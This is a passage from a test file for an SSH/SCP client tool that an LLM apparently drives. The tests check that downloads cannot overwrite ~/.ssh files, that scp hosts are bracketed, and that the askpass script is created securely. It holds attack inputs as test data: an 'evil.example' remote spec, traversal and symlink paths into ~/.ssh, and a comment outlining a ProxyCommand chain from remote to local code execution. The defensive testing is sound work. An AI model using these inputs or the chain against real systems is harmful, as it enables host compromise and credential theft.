    const mod = await loadServerAs(platform);
    const client = new mod.SSHClient() as unknown as TestClient;
    mod.fs.readFile.mockResolvedValue(`Host test\n    HostName 1.2.3.4\n`);
    client._execFileAsync = createMockExecFileAsync();
    return client;
  }

  it('should accept a Windows drive path on Windows', async () => {
    const client = await clientOn('win32');
    expect(await client.downloadFile('test', '/etc/passwd', 'C:\\Users\\me\\out.txt')).toBe(true);
    expect(client._execFileAsync).toHaveBeenCalled();
  });

  it('should accept a UNC path on Windows', async () => {
    const client = await clientOn('win32');
    expect(await client.downloadFile('test', '/etc/passwd', '\\\\server\\share\\out.txt')).toBe(true);
  });

  it('should still refuse a remote spec on Windows', async () => {
    const client = await clientOn('win32');
    expect(
      await client.downloadFile('test', '/etc/passwd', 'scp://attacker@evil.example//tmp/x')
    ).toBe(false);
    expect(client._execFileAsync).not.toHaveBeenCalled();
  });

  it('should refuse a Windows drive path on POSIX, where scp reads it as a host', async () => {
    const client = await clientOn('linux');
    expect(await client.downloadFile('test', '/etc/passwd', 'C:\\Users\\me\\out.txt')).toBe(false);
    expect(client._execFileAsync).not.toHaveBeenCalled();
  });

  it('should treat a backslash as a separator only on Windows', async () => {
    // "dir\file:name" — on Windows the backslash makes it a path; on POSIX the
    // backslash is an ordinary character, so scp would see host "dir\file".
    const onWindows = await clientOn('win32');
    expect(await onWindows.downloadFile('test', '/etc/passwd', 'dir\\file:name.txt')).toBe(true);

    const onPosix = await clientOn('linux');
    expect(await onPosix.downloadFile('test', '/etc/passwd', 'dir\\file:name.txt')).toBe(false);
  });
});

// =============================================================================
// Security findings from the 2026-08 review
// =============================================================================

describe('localPath must not target the SSH configuration directory', () => {
  // ~/.ssh/config is the trust base: it *is* the host allowlist, and ssh executes
  // a ProxyCommand found there through /bin/sh. Letting a tool argument overwrite
  // it turns the documented remote RCE of runRemoteCommand into local RCE:
  //   1. runRemoteCommand(anyHost, 'cat > /tmp/x …ProxyCommand /bin/sh -c "…"…')
  //   2. downloadFile(thatHost, '/tmp/x', '~/.ssh/config')
  //   3. runRemoteCommand('evil', 'true')  -> ProxyCommand runs locally
  // Step 3 was verified by hand against the real ssh binary.
  let client: TestClient;

  beforeEach(() => {
    client = new SSHClient() as unknown as TestClient;
    vi.clearAllMocks();
    readFile.mockResolvedValue(`Host test\n    HostName 1.2.3.4\n`);
    client._execFileAsync = createMockExecFileAsync();
  });

  const sshDir = join(homedir(), '.ssh');

  it.each([
    ['the config itself', join(sshDir, 'config')],
    ['known_hosts', join(sshDir, 'known_hosts')],
    ['authorized_keys', join(sshDir, 'authorized_keys')],
    ['a private key', join(sshDir, 'id_ed25519')],
    ['an included config', join(sshDir, 'config.d', 'extra.conf')],
  ])('should refuse downloadFile writing over %s', async (_label, localPath) => {
    const result = await client.downloadFile('test', '/tmp/payload', localPath);

    expect(result).toBe(false);
    expect(client._execFileAsync).not.toHaveBeenCalled();
  });

  it('should refuse a traversal path that lands in ~/.ssh', async () => {
    const traversal = join(sshDir, 'subdir', '..', 'config');

    expect(await client.downloadFile('test', '/tmp/payload', traversal)).toBe(false);
    expect(client._execFileAsync).not.toHaveBeenCalled();
  });

  it('should refuse a relative path that resolves into ~/.ssh', async () => {
    const relPath = relative(process.cwd(), join(sshDir, 'config'));

    expect(await client.downloadFile('test', '/tmp/payload', relPath)).toBe(false);
    expect(client._execFileAsync).not.toHaveBeenCalled();
  });

  // uploadFile only READS localPath, so the guard deliberately does not apply
  // there: it protects the integrity of the trust base, not its confidentiality.
  // Blocking reads would be theatre — ~/.aws/credentials and every other secret
  // stay readable by design (see the threat model) — and would break the
  // legitimate case of backing up one's own config to a configured host.
  it('should still allow uploadFile to read from ~/.ssh', async () => {
    expect(await client.uploadFile('test', join(sshDir, 'config'), '/backup/cfg')).toBe(true);
    expect(client._execFileAsync).toHaveBeenCalled();
  });

  it('should refuse a tilde path, which is never expanded without a shell', async () => {
    expect(await client.downloadFile('test', '/tmp/payload', '~/.ssh/config')).toBe(false);
    expect(client._execFileAsync).not.toHaveBeenCalled();
  });

  it('should refuse a differently-cased spelling on case-insensitive filesystems', async () => {
    // realpath does not canonicalise case on macOS/Windows, so a case-sensitive
    // comparison is bypassable by spelling it .SSH.
    const upper = join(homedir(), '.SSH', 'config');
    const expected = process.platform === 'linux';  // case-sensitive FS: a real other dir

    expect(await client.downloadFile('test', '/tmp/payload', upper)).toBe(expected);
  });

  it('should refuse the ssh directory itself as a destination', async () => {
    expect(await client.downloadFile('test', '/tmp/payload', sshDir)).toBe(false);
  });

  // Deliberately points at a file that need not exist: on a fresh machine
  // ~/.ssh is absent, and realpath does not resolve a link with a missing
  // target — the exact case a planted link would exploit.
  it('should refuse a symlink that points into ~/.ssh', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcp-ssh-link-'));
    const link = join(dir, 'innocent.txt');
    try {
      symlinkSync(join(sshDir, 'config'), link);
    } catch {
      rmSync(dir, { recursive: true, force: true });
      return;  // no symlink privilege (Windows CI) — nothing to assert
    }
    try {
      expect(await client.downloadFile('test', '/tmp/payload', link)).toBe(false);
      expect(client._execFileAsync).not.toHaveBeenCalled();
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it('should still allow paths merely containing .ssh as a substring', async () => {
    // /tmp/.sshfoo and ~/.ssh-backup are not the SSH directory.
    expect(await client.downloadFile('test', '/remote', '/tmp/.sshfoo/x')).toBe(true);
  });

  it('should still allow ordinary destinations', async () => {
    expect(await client.downloadFile('test', '/remote', '/tmp/out.txt')).toBe(true);
    expect(client._execFileAsync).toHaveBeenCalled();
  });
});

describe('scp host is bracketed so scp cannot re-split it', () => {
  // scp splits its remote spec on the FIRST colon, while ssh does not split its
  // destination at all. Verified against the real binaries:
  //   'a:b:/tmp/x'          -> connects to host 'a'         (allowlist bypass)
  //   '2001:db8::1:/tmp/x'  -> connects to 0.0.7.209        (functional bug)
  //   '[2001:db8::1]:/tmp/x'-> connects to 2001:db8::1      (correct)
  let client: TestClient;

  beforeEach(() => {
    client = new SSHClient() as unknown as TestClient;
    vi.clearAllMocks();
    client._execFileAsync = createMockExecFileAsync();
  });

  it('should bracket a plain alias', async () => {
    readFile.mockResolvedValue(`Host test\n    HostName 1.2.3.4\n`);

    await client.downloadFile('test', '/remote/f', '/local/f');

    expect(client._execFileAsync).toHaveBeenCalledWith(
      SCP_BIN,
      ['-o', 'StrictHostKeyChecking=accept-new', '--', '[test]:/remote/f', '/local/f'],
      expect.any(Object)
    );
  });

  it('should keep user@ outside the bracket', async () => {
    // scp reads '[user@host]:/p' as host 'host]' — the bracket belongs around
    // the host only.
    readFile.mockResolvedValue(`Host test\n    HostName 1.2.3.4\n`);

    await client.uploadFile('root@test', '/local/f', '/remote/f');

    expect(client._execFileAsync).toHaveBeenCalledWith(
      SCP_BIN,
      expect.arrayContaining(['root@[test]:/remote/f']),
      expect.any(Object)
    );
  });

  it('should make a bare IPv6 host work instead of silently targeting another host', async () => {
    readFile.mockResolvedValue(`Host v6\n    HostName 2001:db8::1\n`);

    await client.downloadFile('2001:db8::1', '/remote/f', '/local/f');

    expect(client._execFileAsync).toHaveBeenCalledWith(
      SCP_BIN,
      expect.arrayContaining(['[2001:db8::1]:/remote/f']),
      expect.any(Object)
    );
  });

  it('should stop a colon-bearing alias from redirecting scp to another host', async () => {
    // Without brackets scp would connect to 'a', which is not what the allowlist
    // approved.
    readFile.mockResolvedValue(`Host a:b\n    HostName 1.2.3.4\n`);

    await client.downloadFile('a:b', '/remote/f', '/local/f');

    expect(client._execFileAsync).toHaveBeenCalledWith(
      SCP_BIN,
      expect.arrayContaining(['[a:b]:/remote/f']),
      expect.any(Object)
    );
  });
});

describe('askpass script is created unpredictably and exclusively', () => {
  // The helper is executed by ssh with MCP_SSH_PASS in its environment, so a
  // co-located local user who can pre-place the path controls what runs and can
  // capture the password. Not reachable by the LLM (needs a local account), but
  // it guards a secret, so it should not sit at a guessable path.
  let posixClient: TestClient;
  let posixFs: MockedFs;

  beforeEach(async () => {
    const posix = await loadServerAs('linux');
    posixClient = new posix.SSHClient() as unknown as TestClient;
    posixFs = posix.fs;
    posixFs.writeFile.mockResolvedValue(undefined);
    posixFs.chmod.mockResolvedValue(undefined);
  });

  it('should not use a path derived only from the pid', async () => {
    const scriptPath = await posixClient.getAskpassScript();

    // The script must not sit directly in the shared temp dir, where its name
    // would be guessable from the pid alone.
    expect(dirname(scriptPath)).not.toBe(tmpdir());
    expect(dirname(scriptPath)).toMatch(/mcp-ssh-/);
  });

  it('should create the file exclusively so an existing path is never followed', async () => {
    await posixClient.getAskpassScript();

    expect(posixFs.writeFile).toHaveBeenCalledWith(
      expect.stringContaining('mcp-ssh-askpass'),
      '#!/bin/sh\necho "$MCP_SSH_PASS"\n',
      expect.objectContaining({ flag: 'wx' })
    );
  });
});

describe('SSH directory guard across filesystem semantics', () => {
  async function clientOn(platform: string) {
    const mod = await loadServerAs(platform);
    const client = new mod.SSHClient() as unknown as TestClient;
    mod.fs.readFile.mockResolvedValue(`Host test\n    HostName 1.2.3.4\n`);
    client._execFileAsync = createMockExecFileAsync();
    return client;
  }

  it('should compare case-sensitively on Linux, where .SSH is a different directory', async () => {
    const client = await clientOn('linux');
    const upper = join(homedir(), '.SSH', 'config');

    expect(await client.downloadFile('test', '/remote', upper)).toBe(true);
  });

  it('should still block the real directory on Linux', async () => {
    const client = await clientOn('linux');

    expect(await client.downloadFile('test', '/remote', join(homedir(), '.ssh', 'config'))).toBe(false);
  });

  it('should not hang on a symlink loop', async () => {
    const client = await clientOn('linux');
    const dir = mkdtempSync(join(tmpdir(), 'mcp-ssh-loop-'));
    const a = join(dir, 'a');
    const b = join(dir, 'b');
    try {
      symlinkSync(b, a);
      symlinkSync(a, b);
    } catch {
      rmSync(dir, { recursive: true, force: true });
      return;   // no symlink privilege
    }
    try {
      // Must terminate and treat the unresolvable path as an ordinary one.
      expect(await client.downloadFile('test', '/remote', a)).toBe(true);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it('should accept a destination whose top-level directory does not exist', async () => {
    // Exercises the fall-through in the prefix walk: nothing on the path resolves.
    const client = await clientOn('linux');

    expect(await client.downloadFile('test', '/remote', '/no-such-top-level-xyz/a/b.txt')).toBe(true);
  });
});
